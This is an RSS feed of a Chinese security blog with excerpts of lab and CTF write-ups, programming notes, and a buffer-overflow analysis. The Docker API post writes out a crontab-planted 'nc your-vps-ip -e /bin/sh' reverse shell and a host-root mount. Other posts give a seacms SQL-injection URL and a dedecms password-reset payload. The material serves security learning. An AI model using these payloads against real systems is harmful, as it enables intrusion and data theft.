<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on 爆肚的杂货铺</title>
    <link>https://b40du.github.io/posts/</link>
    <description>Recent content in Posts on 爆肚的杂货铺</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>This is a customized copyright.</copyright>
    <lastBuildDate>Tue, 14 Jul 2020 01:25:33 +0800</lastBuildDate>
    
	<atom:link href="https://b40du.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>利用MSF进行三层内网靶场渗透（基础篇）</title>
      <link>https://b40du.github.io/posts/writeup-chaitin-intranet-penetration-01/</link>
      <pubDate>Tue, 14 Jul 2020 01:25:33 +0800</pubDate>
      
      <guid>https://b40du.github.io/posts/writeup-chaitin-intranet-penetration-01/</guid>
      <description>基础篇  虚拟机 Kali 攻击机 + Windows 内外网机器   进阶篇  公网 vps 攻击机 + Windows 内外网机器 公网 vps 攻击机 + Linux 外网机器 + Windows内网机器   高阶篇  公网 vps 攻击机 + Linux 外网机器（内网Linux服务器映射） + Linux内网服务器 + Windows内网机器    1. 环境搭建 1.1 主机信息  Kali Linux 攻击机 Windows 7 x1（内外网-双网卡） Windows 7 x2（内网-双网卡） Windows 7 x3（内网-单网卡）  1.2 网络拓扑 一开始的打算是按照如下拓扑进行实验：
多次搭建后频频卡住，遂改变思路，先完成最简单的实验：
1.3 环境配置 手动开启永恒之蓝漏洞。
2. 攻击实施 先说一下大体的攻击流程：</description>
    </item>
    
    <item>
      <title>Typecho反序列化漏洞</title>
      <link>https://b40du.github.io/posts/writeup-chaitin-deserialization-01/</link>
      <pubDate>Fri, 10 Jul 2020 23:10:01 +0800</pubDate>
      
      <guid>https://b40du.github.io/posts/writeup-chaitin-deserialization-01/</guid>
      <description>1. 前置知识 1.1 什么是反序列化？ 序列化：将对象变成可以传输的字符串（Json格式便是一种序列化）
反序列化：将可以传输的字符串再变成对象
1.2 为何造成漏洞产生？ 漏洞产生的原因主要是因为PHP语言自带的魔术方法，魔术方法一般是由__开头，在某些条件下可以自动调用，而不需要我们手工调用。
如果是学习过C++的同学应该理解，如果我们创建一个空的类，它本身会默认产生如下几个类成员函数：
class A { 缺省构造函数 缺省拷贝构造函数 缺省析构函数 缺省赋值运算符 缺省取址运算符 缺省取址运算符 const。 } 那么在类创建对象的时候，构造函数会首先执行，在我们销毁对象的时候，析构函数会最后执行，而构造函数和析构函数执行的时候，并不需要我们手动操作。
那么PHP语言自带的魔术方法，也是类似的情况，在创建/销毁对象以及其他若干操作的时候，会自动调用某些魔术方法。
一般情况下如下魔术方法是我们特别需要警惕的：
   方法 调用条件     __wakeup() 使用unserialize()时调用   __sleep() 使用serialize()时调用   __construct() 当对象创建时会自动调用（单在unserialize()时是不会自动调用的）   __destruct() 当对象被销毁时会自动调用   __call() 在对象上下文中调用不可访问的方法时调用   __callStatic() 在静态上下文中调用不可访问的方法时调用   __get() 用于从不可访问的属性读取数据，在对象上下文中调用不可访问的方法时触发   __set() 用于将数据写入不可访问的属性   __isset() 在不可访问的属性上调用isset()或empty()触发   __unset() 在不可访问的属性上使用unset()时触发   __toString() 当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用   __invoke() 当脚本尝试将对象调用为函数时触发    如果服务器能够接收我们反序列化过的字符串，并且未经过滤，直接把字符串中的变量交给魔术方法自动执行，就很有可能产生意想不到的问题以及漏洞。</description>
    </item>
    
    <item>
      <title>Docker Daemon Api 未授权访问漏洞复现</title>
      <link>https://b40du.github.io/posts/reproduce-web-docker-daemon-api/</link>
      <pubDate>Wed, 08 Jul 2020 23:55:11 +0800</pubDate>
      
      <guid>https://b40du.github.io/posts/reproduce-web-docker-daemon-api/</guid>
      <description>1. 漏洞描述 Docker是一种开源的应用容器引擎，由于权限设置不当以及端口暴露在外网等原因，可以利用该漏洞访问Docker对外开放的一个API接口，进行远程命令执行。
2. 漏洞成因 Docker在使用集群管理（如：Kubernetes，swarm）时，要使用remote api对节点进行管理，remote api无认证时的默认端口是2375（需要TLS认证默认登录是2376）。
而remote api默认是可以不需要认证能直接访问，能直接对Docker进行操作，如新建容器，删除容器，查看镜像容器信息等等。
3. 漏洞复现 3.1 进入vulhub漏洞目录，启动漏洞环境 3.2 探测2375端口 如果是公网的其他主机，我们需要探测2375端口。
由于是靶场搭建漏洞环境，在这里我们直接访问http://youer-vps-ip:2375/version请求，如果返回包带有json格式，说明存在该漏洞。
3.3 利用漏洞查看镜像、创造容器 在远程vps中，构造如下poc，进行测试：
docker -H=tcp://your-vps-ip:2375 images 然后我们新建一个容器，并将entrypoint设置为/bin/bash或者/bin/sh，挂载点设置为服务器的根目录挂载至/tmp目录下，然后使用ls命令查看。
docker -H=tcp://your-vps-ip:2375 run -it -v /:/tmp --entrypoint /bin/sh alpine:latest 然后使用命令查看所有的容器。
docker -H=tcp://your-vps-ip:2375 ps -a 3.4 利用漏洞反弹shell 我们启动一个容器，并将宿主机的/etc目录挂载到容器中，这个时候我们便已经可以任意读写文件了。接下来我们需要做的就是将命令写入crontab配置文件，进行反弹shell。于是在自己的vps上构造如下poc：
import docker client = docker.DockerClient(base_url=&amp;#39;http://靶场ip:2375/&amp;#39;) data = client.containers.run(&amp;#39;alpine:latest&amp;#39;, r&amp;#39;&amp;#39;&amp;#39;sh -c &amp;#34;echo &amp;#39;*/1 * * * * /usr/bin/nc your-vps-ip 7890 -e /bin/sh&amp;#39; &amp;gt;&amp;gt; /tmp/etc/crontabs/root&amp;#34; &amp;#39;&amp;#39;&amp;#39;, +=True, volumes={&amp;#39;/etc&amp;#39;: {&amp;#39;bind&amp;#39;: &amp;#39;/tmp/etc&amp;#39;, &amp;#39;mode&amp;#39;: &amp;#39;rw&amp;#39;}}) 然后同时另外开启一个控制台，使用nc监听7890端口：</description>
    </item>
    
    <item>
      <title>Writeup 之 业务逻辑 魔改flag版</title>
      <link>https://b40du.github.io/posts/writeup-chaitin-business_logic-01/</link>
      <pubDate>Tue, 07 Jul 2020 23:35:20 +0800</pubDate>
      
      <guid>https://b40du.github.io/posts/writeup-chaitin-business_logic-01/</guid>
      <description>由于靶场被频繁扫描，断连率颇高，dedecms使用本地搭建进行测试。
1. 越权dedecms 首先进入靶场首页，是个经典的dedecms建站系统。
1. 注册用户 首先我们注册一个普通用户，用户名：00001，密码：00001。
成功注册。
2. 越权到admin 如下图所示，已经进入到00001账户。
然后访问个人主页。
我们查看当前的cookie。
然后我们将DedeUserID改成自己的账户名00001，将DedeUserID__ckMd5改成last_vid__ckMd5的值。
修改完成后，访问个人主页，已经变成了admin。
这个时候，我们已经实现越权，登录到了admin账户的前台。接下来，我们尝试修改前台密码。
3. 修改admin前台密码 我们需要利用漏洞来重置前台admin用户的密码。
访问靶场地址：
http://靶场ip:端口/member/resetpassword.php构造payload如下：
dopost=safequestion&amp;amp;safequestion=0.0&amp;amp;safeanswer=&amp;amp;id=1我们使用hackbar发送payload，并使用burp去抓取这个post数据包。
然后放掉这个post包，抓到修改密码的数据包。
然后在浏览器中访问这个地址，即可修改前台admin账户密码。
4. 修改admin后台密码 我们发现在dedecms中，如果账户是admin，修改前台密码以后，后台账户密码也会同步改变。
2. phpyun 首先进入首页，发现是一个phpyun的cms建站系统建立的网站。
可以操作的空间非常多，因为有非常多的框框，由于题目要求是找出admin的密码，瞬间想到了几个思路
 强制爆破admin账户密码 取得权限，找出admin的账户密码  那么我们先用御剑跑一波，看看后台地址在哪里
如愿以偿，发现了后台地址，我们进入后台地址看一下，发现是有验证码的。
手工尝试弱密码后，发现每次验证码都需要变化，我们试试burp抓包。
抓到了，然后发送至repeater，手动测试看一看。
我们发现这个验证码在burp里面是可以重复使用的，密码一直错误，但是一直可以使用。那我们可以换一个省力一点的方法，使用字典爆破。
我们重新抓包，发送到intruder。
清除多余的有效负载后，给密码处添加有效负载。
由于字典的好坏直接影响爆破的效率，在这里我们尝试了多个字典。
终于成功爆破，发现密码Password，也就是flag{Password}
 flag{Password}
 3. seacms 首先进入靶场首页，发现是一个海洋CMS建站系统建立的网站。
先上扫描器看看吧。
虽然发现很多文件，但是针对题目要求，没有发现什么特别的地方，无非是登录注册入口。
那么我们先注册一个账户试试看。
成功注册
进入系统后，没有发现特别多的东西，发现了密码其实可以直接在控制台看到md5加密后的密码，是完全可以被XSS等利用的。
另外发现test02@test.com的位置是很有可能存放flag的地方。
那么我们退出去注册flag账户试试看，发现用户已经存在。
那我们登录自己的账户，然后找回密码，抓包的过程中把用户改成flag能不能借此更改flag账户的密码呢？
结果发现，系统应该没有配置邮件服务器，无法发送邮件。我们看不到更改密码所需要的链接。
借此我们完全可以推测，这是一个利用找回密码机制更改密码的逻辑漏洞，我的推测是，在找回密码的邮件里有修改密码的链接，用户可能是flag，修改链接中的参数可以越过原本的账户把flag账户密码改掉，进入flag账户，然后找到存放邮箱的地方，找到flag。
那么是不是这样就没办法了找到flag了呢，其实不然。这种CMS漏洞百出，我们完全可以使用其他的payload进行攻击。
经过查询，发现seacms在老版本中一直存在SQL注入漏洞，我们使用现成的payload注入看看。
/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 好像可以
那么我们不断更改payload，找找看，发现最大的问题是不知道表名列名，所以总是错误。
/comment/api/index.php?gid=1&amp;amp;page=2&amp;amp;rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_test01))),@`%27` 大家在一起讨论的时候，岚哥爆出来了表名和列名，发现有很多奇怪的列名，都是sea_开头，因此后续尝试根据不同的列名进行元素的查找，列名非常多。
我们回想起来，flag是存放在邮箱的位置的，那么我们构造一下payload：</description>
    </item>
    
    <item>
      <title>Writeup 之 XXE-Labs 魔改flag版</title>
      <link>https://b40du.github.io/posts/writeup-chaitin-xxe_labs-01/</link>
      <pubDate>Mon, 06 Jul 2020 23:56:33 +0800</pubDate>
      
      <guid>https://b40du.github.io/posts/writeup-chaitin-xxe_labs-01/</guid>
      <description>1. xxe实验室 前三个比较简单，直接进入第四个
首先我们要明确Blind XXE的用途，对于传统的XXE来说，必须要求服务器有回显或者报错，才能使用XXE读取服务器端的文件。如果服务器没有回显，只能使用Blind XXE漏洞来构建一条带外信道提取数据。
那么从源代码来看，前几个和第四个有何不同呢
 DOMDocument.php   SimpleXMLElement.php   simplexml_load_string.php   BlindXXE.php  我们发现BlindXXE.php的源代码，直接去掉了回显，没有打印变量，保存到缓冲区的步骤。
找到了根本区别，直接寻找flag吧。
 简单的方法，直接在有回显的地方使用php的filter协议读取文件   然后base64解密，得到flag   flag{xxe_easy}
 2. 短信  进入靶场首页，发现一个类似cms的商务站页面   四处点点看看，发现一个论坛   看看能不能注册，发现管理员禁止了注册   尝试登录，发现每次都需要滑块认证   那么还是上大杀器，目录扫描吧，御剑跑起来   而在这其中呢，/readme.txt文件中有很明显的线索，告诉我们这是一个S-CMS建站系统   然后我们对其进行搜索，看看有没有可以利用的漏洞，发现大都是CNVD录入的SQL注入漏洞，同时看到很多文章都是对这种CMS进行源代码审计查找漏洞的，我们不妨把源程序下载下来，由于是老版本的靶场，特地找了一个老版本的进行下载 然后我们手动的搜索容易产生XXE漏洞的标志性函数simplexml_load_string()   PHP 中的以 simplexml_load 开头的函数默认会解析外部实体，有 XXE 漏洞的标志性函数为 simplexml_load_string()
  经过反复实验，找到一个非常可疑的页面，该页面是api目录下的notify.php页面，这里的$GLOBALS[&#39;HTTP_RAW_POST_DATA&#39;]函数，和php://input的传参方式是一样的，但后面没有对libxml进行过滤，直接就传入了simplexml_load_string()函数   然后我们看看最新版的CMS改成了什么样子，发现多了一个libxml_disable_entity_loader(true)进行保护    网页访问该页面，不会爆出页面不存在的错误，我们使用burp抓包，并发送xml类型的post请求看看</description>
    </item>
    
    <item>
      <title>Writeup 之 Upload-Labs 魔改flag版</title>
      <link>https://b40du.github.io/posts/writeup-chaitin-upload_labs-01/</link>
      <pubDate>Sat, 04 Jul 2020 23:22:33 +0800</pubDate>
      
      <guid>https://b40du.github.io/posts/writeup-chaitin-upload_labs-01/</guid>
      <description>今日总结：  这次靶场主要是做这个有源码的靶场，所以理解源码的含义非常重要  上传实验室-p1  第一关很简单，直接上传1.php，发现前端js报错   推测是前端js检查文件后缀类型，查看js代码，发现js对文件后缀进行了判断   个人习惯直接在控制台重写这个函数而不是用插件，直接在控制台增加.php类型   上传完成后，复制上传文件的地址   使用菜刀进行连接   查看flag   flag{a6487868}
 上传实验室-p2  由于可以查看源码，直接看源码  发现后端在判断文件类型     我们尝试发一个1.php文件，但是改了centent-type类型   发现成功上传，复制上传文件的路径   使用菜刀连接，发现flag文件   找到flag   flag{5b323cff}
 上传实验室-p3  首先我们看源码，发现很多办法都失效了   那么我们尝试用php3试试，发现成功上传，然后复制上传文件路径   连接菜刀，发现flag文件   查看flag   flag{22e47e94}
 上传实验室-p4  首先我们看源码，发现很多办法都失效了    但是.</description>
    </item>
    
    <item>
      <title>笔记-Shell基础</title>
      <link>https://b40du.github.io/posts/note-imooc-shell-basic/</link>
      <pubDate>Thu, 14 May 2020 23:34:19 +0800</pubDate>
      
      <guid>https://b40du.github.io/posts/note-imooc-shell-basic/</guid>
      <description>Shell编程（一） 一、Shell概述 1. Shell的介绍  Shell是一个命令行解释器，它为用户提供了一个向Linux内核发送请求以便运行程序的界面系统级程序，用户可以用Shell来启动、挂起、停止甚至是编写一些程序。 Shell还是一个功能强大的编程语言，易编写，易调试，灵活性较强。Shell是解释执行的脚本语言，在Shell中可以直接调用Linux系统命令。   2. Shell的分类  Shell的两种主要语法类型有Bourne和C，这两种语法彼此不兼容。Bourne家族主要包括sh、ksh、Bash、psh、zsh；C家族主要包括：csh、tcsh。  Bourne Shell：从1979年起Unix就开始使用Bourne Shell，Bourne Shell的主文件名为sh。 C Shell：C Shell主要在BSD版的Unix系统中使用，其语法和C语言相类似而得名   查看当前系统使用的shell echo $SHELL /bin/bash  Bash：Bash与sh兼容，现在使用的Linux就是使用Bash作为用户的基本Shell  3. Linux支持的Shell  /etc/shells # 打开这个文件 [root@localhost ~]# vi /etc/shells /bin/sh /bin/bash /sbin/nologin /bin/tcsh /bin/csh [root@localhost ~]# sh sh-4.1# exit exit [root@localhost ~]# csh [root@localhost ~]# exit # 进程管理的时候可以知道我们进入了哪个shell exit # 一个shell中可以调用其他shell，也可以调用子shell [root@localhost ~]# bash # windows中打开cmd，就是在Windows当中调用一个子的shell exit   二、脚本执行方式 2.</description>
    </item>
    
    <item>
      <title>笔记-PHP基础</title>
      <link>https://b40du.github.io/posts/note-heima-php-basic/</link>
      <pubDate>Mon, 11 May 2020 23:00:00 +0800</pubDate>
      
      <guid>https://b40du.github.io/posts/note-heima-php-basic/</guid>
      <description>学习目标  掌握互联网的工作原理 掌握域名、DNS和IP地址之间的关系 理解hosts文件在互联网访问过程中的作用 理解静态网站和动态网站的区别 理解动态网站的服务器组成 了解PHP的工作过程 掌握PHP变量的使用方式 理解可变变量的概念 掌握可变变量的访问形式 理解变量的值传递和引用传递的区别  1 PHP简介 1.1 概述  PHP是HyperText Preprocessor的缩写，（超文本预处理器）是一种在服务器端运行的开源的脚本语言 LAMP组合（Linux，Apache，MySQL，PHP），这四个产品都是公开源代码的产品  php 是一门语言，用来做业务逻辑 apache 为PHP提供了运行环境 linux 为Apache的运行提供了平台 mysql 数据库用来存储数据 wamp
windows+apache+ mysql +php 1.2 五个基本概念  静态网站和动态网站  静态页面：服务器不执行的页面 动态页面：服务器执行的页面  动态网站中可以存放静态页面
  客户端和服务器端  客户端：浏览者 服务器端：给浏览者提供服务  端口和端口号  端口号的范围：0~65535  BS架构和CS架构  BS：通过浏览器去访问服务器
b:browser（浏览器） s:server（服务器） 优点： 1. 只要有浏览器就可以访问 2. 开发成本低 缺点： 1. 开发的代码都放在服务器上 胖服务器-瘦客户端  所有的web都是BS架构的</description>
    </item>
    
    <item>
      <title>笔记-JavaScript基础</title>
      <link>https://b40du.github.io/posts/note-heima-javascript-basic/</link>
      <pubDate>Fri, 01 May 2020 16:26:46 +0800</pubDate>
      
      <guid>https://b40du.github.io/posts/note-heima-javascript-basic/</guid>
      <description>2. 初识JavaScript 目标  能够说出JavaScript是什么 能够知道JavaScript的发展历史 能够说出浏览器执行JavaScript的原理 能够说出JavaScript由哪三部分组成 能够写出JavaScript三个输入输出语句  目录  初识JavaScript JavaScript注释 JavaScript输入输出语句  2.1 初识JavaScript 2.1.1 JavaScript历史  布兰登·艾奇（BrendanEich，1961年~） 神奇的大哥在1995年利用10天完成JavaScript涉及 网景公司最初命名位LiveScript，后来在于Sun合作之后将其改名为JavaScript  2.1.2 JavaScript是什么  JavaScript是世界上最流行的语言之一，是一种运行在客户端的脚本语言（Script是脚本的意思） 脚本语言：不需要编译，运行过程中由js解释器（js引擎）逐行来进行解释并执行 现在也可以基于Node.js技术进行服务器端编程  2.1.3 JavaScript的作用  表单动态校验（密码强度检测）（JS产生最初的目的） 网页特效 服务端开发（Node.js） 桌面程序（Election） App（Cordova） 控制硬件-物联网（Ruff） 游戏开发（cocos2d-js）  2.1.4 HTML/CSS/JS的关系 2.1.5 浏览器执行JS简介 浏览器分为两部分 渲染引擎 和 JS引擎
 渲染引擎：用来解析HTML与CSS，俗称内核，比如chrome浏览器的blink，老版本的webkit JS引擎：也称为JS解释器。用来读取网页中的JavaScript代码，对其处理后运行，比如chrome浏览器的V8   浏览器本身并不会执行JS代码，而是通过内置JavaScript引擎（解释器）来执行JS代码。JS引擎执行代码时逐行解释每一句源码（转换为机器语言），然后由计算机去执行，所以JavaScript语言归为脚本语言，会逐行解释执行。
 2.1.6 JS的组成 2.1.6.1 ECMAScript ECMAScript是由ECMA国际（原欧洲计算机制造商协会）进行标准化的一门编程语言，这种语言在万维网上应用广泛，它往往被称为JavaScript或JScript，但实际上后两者是ECMAScript语言的实现和扩展。
ECMAScript：ECMAScript规定了JS的编程语言和基础核心知识，是所有浏览器厂商共同遵守的一套JS语言工业标准。
更多参看MDN：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/JavaScript_technologies_overview
2.1.6.3 DOM——文档对象模型 文档对象模型（Document ObjectModel，简称DOM），是W3C组织推荐的处理可扩展标记语言的标准编程接口。
通过DOM提供的接口可以对页面上的各种元素进行操作（大小、位置、颜色等）。</description>
    </item>
    
    <item>
      <title>笔记-网络工程师</title>
      <link>https://b40du.github.io/posts/note-aqniu-network-engineer/</link>
      <pubDate>Wed, 01 Apr 2020 00:00:00 +0000</pubDate>
      
      <guid>https://b40du.github.io/posts/note-aqniu-network-engineer/</guid>
      <description>目录  第一章：计算机网络基础  计算机网络概述 OSI参考模型与TCP IP（课件有误：SQL、NFS、RPC属于会话层） 局域网基本原理 IP基本原理 TCP与UDP   第二章：网络设备操作入门  网络设备及其操作系统介绍 命令行操作基础 网络设备文件管理 网络设备文件管理-操作实验 网络设备升级操作ComwareV7msr2630 网络设备基本调试   第三章：配置局域网交换  以太网交换机工作原理 vlan配置 vlan配置-实验 生成树协议 生成树协议-实验 端口安全技术 端口安全技术-实验 配置链路聚合 配置链路聚合-实验   第四章：高级TCP/IP知识  子网划分 DNS域名系统 文件传输协议 DHCP IPv6   第五章：配置IP路由  IP路由原理 直连路由和静态路由 直连路由和静态路由-实验 路由协议概述 RIP原理 RIP原理-实验 OSPF基础 OSPF基础-实验   第六章：配置安全的分支网络  用访问控制列表实验包过滤 用访问控制列表实验包过滤-实验 网络地址转换 网络地址转换-实验   第七章：广域网连接和互联  配置HDLC 配置PPP    第一章：计算机网络基础 1.</description>
    </item>
    
    <item>
      <title>漏洞分析 之 EFS Web Server 7.2 获取HTTP请求SEH缓冲区溢出</title>
      <link>https://b40du.github.io/posts/report-vul-efs-web-server-7.2/</link>
      <pubDate>Fri, 11 Oct 2019 16:38:33 +0800</pubDate>
      
      <guid>https://b40du.github.io/posts/report-vul-efs-web-server-7.2/</guid>
      <description>1. 软件简介 Easy File Sharing Web Server（简易文件共享Web服务器）是一种Internet文件共享程序，允许我们在没有任何其他软件或服务的情况下托管安全的个人Web服务器。访问者可以通过Web浏览器（Internet Explorer，Netscape，Opera等）轻松上传/下载文件。
因此，简单来说，它可以帮助我们与朋友或同事共享文件。这个基于Web的软件可以让我们将文件传送给任何拥有配置有浏览器的PC，而不用繁琐地安装多个软件。也可以让我们的同事或朋友轻松浏览用我的PC搭建的服务器并进行搜索，显示和/或下载经过我授予他们访问权限的文件。
2. 漏洞复现 2.1 软件下载 Exploit-DB漏洞库地址：https://www.exploit-db.com/exploits/39008
软件下载地址：https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe
Python下载地址：https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi
2.2 环境搭建 安装Easy File Sharing Web Server 7.2
安装成功后，打开桌面上的EFS软件，点击Try it!
可以看到，EFS Web Server已经开始运行，此时在我们的本地建立了一个Web服务器，并开启了80端口和443端口。
然后打开IE浏览器，在地址栏输入http://127.0.0.1/或者http://localhost/或者是EFS软件启动时显示的IP地址类型的http链接http://192.168.25.142
此时我们可以看到，IE浏览器访问本地网页的时候，是正常显示的。
如果我们的电脑没有Python环境，我们需要安装好Python环境，目的是为了方便之后我们使用Poc.py进行简易测试。
然后我们检查一下Poc.py，确认无误。
2.3 软件测试 接下来我们打开cmd.exe，并使用python执行Poc.py，输入参数，看看会发生什么。
我们刷新刚才访问的IE浏览器界面，发现网页崩溃了。同时我们发现之前搭建本地Web环境的EFS软件已经退出运行了，看来是由于服务器崩溃导致的网页崩溃，而非本地浏览器的问题。
此时基本上我们已经把漏洞复现了出来。
但是我们也观察到了另外一个情况，按理说，xp系统如果程序遇到异常，会弹出一个错误对话框，并能够在其中查找到错误的类型以及内存地址，也就是Windows异常处理机制作用的显示形式。
而此时此刻我们没有发现错误对话框，程序崩溃时反而直接自动退出了，因此我们需要思考一下，是不是程序的错误导致异常处理机制也产生了错误，这也是我们后面分析的一个重点。
3. 漏洞分析 3.1 漏洞成因 Easy File Sharing Web Server 7.2 版本中存在缓冲区溢出漏洞。
远程攻击者可发送GET数据包，由于软件中的fsws.exe在处理GET数据包的路径时，没有对路径内容进行检查，而是直接拼接传参，导致某些关键指针被覆盖，从而导致在软件使用的sqlite3.dll中执行某个函数时，由于引用了无效地址，进而触发SEH异常处理流程或覆盖SHE异常处理函数的指针，导致任意代码执行。
因此，简单来说，远程攻击者可以发送GET数据包，用数据包中的长字符串利用该漏洞执行任意代码。
接下来我们来回溯一下，分析该软件的详细过程。
3.2 分析过程 首先我们附加EFS Web Server这个程序，按g运行，然后用cmd.exe执行我们从漏洞库下载的Poc.py，发现程序中断了，产生了异常。
可以看到，这里执行了一个cmp的汇编指令，作用是比较后面两个操作数是否相等。比较的是1个四字节指针 [eax+4Ch]和0A29A697h地址上的内容，那么在比较的过程中，发现eax寄存器的值已经变成了41414141。显然这个地址不太像一个可读的地址。
那不妨查看一下eax的值，在命令窗口输入dd eax。
然后我们可以看到，在输入dd eax之后，发现内存空间里全部都是问号，eax值是一个不可读的地址。也就是说这个是空间没有被开辟出来导致的内存访问异常。
接下来我们按g。
执行过后，我们发现，eip指向41414141，这同样是一个不可读的地址，到这个时候我们已经发现41414141其实是我们之前构造的payload里面大写字母A的ASCII码。所以说，现在是由于程序的某处产生了错误，导致栈被覆盖。
出现异常时，理论上程序会进入异常处理链进行异常处理，但是由于栈中的SEH链也被覆盖，导致这个链中存放的SEH异常处理函数的指针也被覆盖，因而eip指向的地址是41414141。
而在异常处理中呢，会调用这个SEH中的异常处理指针，去执行异常处理函数。那么当这个指针被覆盖的时候，调用这个指针指向的地址如果被我们所控制，就能够按照我们的想法，去执行一些代码，这也是后面漏洞利用的一种方式。
那么我们现在要分析一下，为什么[eax+0Ch]这个地址会被41414141覆盖。这个时候我们需要使用kb命令来查看一下之前堆栈调用的情况。</description>
    </item>
    
  </channel>
</rss>